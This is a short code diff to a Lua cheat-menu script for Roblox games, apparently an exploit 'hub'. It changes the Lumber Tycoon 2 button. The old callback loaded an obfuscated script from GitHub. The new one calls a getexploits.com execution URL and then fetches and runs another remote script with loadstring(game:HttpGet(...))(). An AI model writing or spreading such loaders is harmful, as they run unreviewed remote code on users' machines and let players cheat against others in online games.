@@ -220,7 +220,9 @@ Tab:AddParagraph("imformation","blox fruit script that is old")
 
 local Tab = Window:MakeTab({ 	Name = "lumber tycoon 2", 	Icon = "rbxassetid://4431164390", 	PremiumOnly = false })
 
-Tab:AddButton({ 	Name = "lumbertycoon", 	Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/butter-hub/main/butters%20recode-obfuscated.lua'))("Apple is cute")
+Tab:AddButton({ 	Name = "lumbertycoon", 	Callback = function() game:HttpGet("https://getexploits.com/cexecution/694139985821192192")
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/darkxwin/darkxsourcethinkyoutousedarkx/main/darkx")()
 
 end })
 
